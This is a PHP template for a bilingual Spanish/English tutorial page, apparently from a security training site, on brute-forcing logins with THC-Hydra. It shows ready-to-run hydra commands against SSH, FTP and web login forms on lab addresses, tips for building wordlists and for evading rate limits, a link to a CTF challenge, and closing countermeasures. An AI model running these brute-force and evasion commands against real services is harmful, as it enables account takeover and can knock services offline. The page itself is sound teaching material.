<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Hydra: Ataques de Fuerza Bruta — CyberEscudo' : 'Hydra: Brute Force Attacks — CyberEscudo';
$contentTitle = $lang==='es' ? 'Hydra: Ataques de Fuerza Bruta' : 'Hydra: Brute Force Attacks';
$contentDate  = '2022-03-15';
$contentDiff  = 'intermediate';
$contentTags  = ['Hydra','Fuerza Bruta','Contraseñas','SSH','HTTP','Wordlists'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p><strong>THC-Hydra</strong> es la herramienta de fuerza bruta de inicio de sesión de red (online) más rápida y versátil del mercado. A diferencia de John the Ripper o Hashcat (que rompen hashes offline), Hydra ataca directamente a los servicios vivos en red. Es compatible con más de 50 protocolos: SSH, FTP, HTTP, SMB, RDP, MySQL, etc.</p>

  <h2>1. Diccionarios: La munición de Hydra</h2>
  <p>Un ataque de fuerza bruta es tan bueno como el diccionario (Wordlist) que utilices. Tirar palabras al azar no funciona hoy en día. Necesitamos inteligencia.</p>
  <pre><code># 1. Rockyou (El clásico indispensable):
# Se encuentra en Kali Linux por defecto.
/usr/share/wordlists/rockyou.txt

# 2. Generar diccionarios personalizados con Crunch:
# Útil si sabes la política de contraseñas de la empresa.
# Ejemplo: Generar todas las combinaciones de 8 caracteres (minúsculas y números):
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt

# 3. CeWL (Custom Word List generator):
# Araña una web y crea un diccionario con las palabras que usa la empresa.
cewl -d 2 -m 5 -w corp_words.txt https://megacorp.local</code></pre>

  <h2>2. Fuerza bruta contra protocolos de red (SSH / FTP)</h2>
  <p>La sintaxis básica para servicios estándar es sencilla. Ten cuidado con los bloqueos por intentos fallidos (Fail2Ban).</p>
  <pre><code># Usuario conocido (admin) y diccionario de contraseñas (-P mayúscula):
hydra -l admin -P rockyou.txt ssh://192.168.1.10

# Lista de usuarios (-L) y lista de contraseñas (-P) (Ataque en clúster):
hydra -L users.txt -P rockyou.txt ftp://192.168.1.10

# Especificar un puerto no estándar (-s):
hydra -l root -P pass.txt -s 2222 ssh://192.168.1.10

# Aumentar la velocidad con hilos paralelos (-t):
# NOTA: Cuidado, demasiados hilos tirarán el servicio (DoS).
hydra -l root -P pass.txt -t 16 ssh://192.168.1.10</code></pre>

  <h2>3. La Bestia: Fuerza Bruta contra Web (HTTP POST/GET)</h2>
  <p>Atacar un formulario web es lo más complejo en Hydra porque requiere indicarle exactamente cómo se forma la petición HTTP. La estructura para el módulo <code>http-post-form</code> tiene 3 partes separadas por dos puntos (<code>:</code>):</p>
  <ol>
      <li><strong>Ruta:</strong> Dónde está el formulario (ej: <code>/login.php</code>).</li>
      <li><strong>Body/Datos:</strong> Los campos del formulario, sustituyendo el usuario por <code>^USER^</code> y la contraseña por <code>^PASS^</code>.</li>
      <li><strong>Condición de Fallo:</strong> El texto que la web devuelve <em>sólo</em> cuando fallas el login (ej: <code>Invalid credentials</code>).</li>
  </ol>
  
  <pre><code># Ejemplo completo de ataque HTTP POST:
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# Si la web usa cookies (sesiones PHP), hay que añadirlas al final con "H=":
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed:H=Cookie: PHPSESSID=abc123"</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 11 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Simulador de Sintaxis Hydra
      </h3>
      <p style="margin-bottom: 1.5rem;">Construir el comando de Hydra para atacar webs es un arte. Hemos interceptado una petición POST de un panel de administrador. Tu misión es analizar la estructura HTTP y escribir el comando exacto para lanzar el ataque.</p>
      <a href="/ctf/ctf-11.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 11
      </a>
  </div>

  <h2>4. Evasión, Proxies y Reanudación</h2>
  <p>Los firewalls detectarán un ataque de Hydra en milisegundos si no vas con cuidado.</p>
  <pre><code># Añadir retraso entre intentos (-W) para evadir Rate Limiting (en segundos):
hydra -l admin -P pass.txt -W 3 ssh://192.168.1.10

# Pasar el tráfico por un Proxy (Ej: Burp Suite para debuggear qué hace Hydra):
export HYDRA_PROXY_HTTP="http://127.0.0.1:8080"
hydra -l admin -P pass.txt 192.168.1.10 http-get /admin

# Reanudar un ataque interrumpido (Hydra crea un archivo hydra.restore automáticamente):
hydra -R</code></pre>

  <h2>5. Contramedidas (Defensa contra Hydra)</h2>
  <ul>
    <li><strong>Bloqueo de IPs (Fail2Ban/WAF):</strong> La defensa más efectiva. Banear la IP automáticamente si falla la contraseña 5 veces en menos de 5 minutos.</li>
    <li><strong>CAPTCHAs o Desafíos Invisibles:</strong> Añadir reCAPTCHA en el formulario de login destroza la capacidad de herramientas automatizadas como Hydra.</li>
    <li><strong>Tokens Anti-CSRF dinámicos:</strong> Si cada petición requiere un token dinámico distinto, Hydra fallará porque no está diseñado para extraer y reutilizar tokens sobre la marcha (en esos casos, se usa Burp Suite Intruder).</li>
    <li><strong>Autenticación Multifactor (MFA/2FA):</strong> Incluso si Hydra adivina la contraseña mediante fuerza bruta, el atacante no podrá entrar sin el código del teléfono móvil.</li>
  </ul>
</div>

<?php else: ?>
<div class="prose">
  <p><strong>THC-Hydra</strong> is the fastest and most versatile online brute-force tool. Unlike John the Ripper (which cracks hashes offline), Hydra attacks live network services directly. It supports over 50 protocols.</p>

  <h2>1. Wordlists: Your Ammunition</h2>
  <p>A brute-force attack is only as good as its wordlist.</p>
  <pre><code># 1. Rockyou (The absolute classic):
/usr/share/wordlists/rockyou.txt

# 2. Custom generation with Crunch (e.g., 8 chars, lowercase + numbers):
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt

# 3. CeWL (Scrape a website to build a context-specific wordlist):
cewl -d 2 -m 5 -w corp_words.txt https://megacorp.local</code></pre>

  <h2>2. Network Protocol Brute Force (SSH / FTP)</h2>
  <pre><code># Known username (admin) and password list (-P uppercase):
hydra -l admin -P rockyou.txt ssh://192.168.1.10

# User list (-L) and password list (-P) (Cluster attack):
hydra -L users.txt -P rockyou.txt ftp://192.168.1.10

# Non-standard port (-s) and multiple threads (-t):
hydra -l root -P pass.txt -s 2222 -t 16 ssh://192.168.1.10</code></pre>

  <h2>3. The Beast: HTTP Form Brute Forcing</h2>
  <p>Attacking a web form is complex. The <code>http-post-form</code> module syntax requires 3 parts separated by colons (<code>:</code>): <strong>Path</strong>, <strong>Post Data</strong> (with <code>^USER^</code> and <code>^PASS^</code> placeholders), and the <strong>Failure String</strong>.</p>
  
  <pre><code># Full HTTP POST attack example:
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# Adding session cookies (required for authenticated portals):
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed:H=Cookie: PHPSESSID=abc123"</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 11 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Hydra Syntax Simulator
      </h3>
      <p style="margin-bottom: 1.5rem;">Building the Hydra command to attack web forms is an art. We've intercepted a POST request to an admin panel. Your mission is to analyze the HTTP structure and write the exact command to launch the attack.</p>
      <a href="/ctf/ctf-11.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 11 CHALLENGE
      </a>
  </div>

  <h2>4. Evasion, Proxies & Resuming</h2>
  <pre><code># Add wait time between attempts to evade rate limiting (in seconds):
hydra -l admin -P pass.txt -W 3 ssh://192.168.1.10

# Route through a Proxy (e.g., Burp Suite for debugging):
export HYDRA_PROXY_HTTP="http://127.0.0.1:8080"

# Resume an interrupted session:
hydra -R</code></pre>

  <h2>5. Defensive Countermeasures</h2>
  <ul>
    <li><strong>IP Banning (Fail2Ban):</strong> Automatically drop traffic from an IP after 5 failed logins.</li>
    <li><strong>CAPTCHAs:</strong> Blocks automated brute-forcing tools effectively.</li>
    <li><strong>Multi-Factor Authentication (MFA):</strong> A stolen/guessed password becomes useless without the secondary token.</li>
  </ul>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';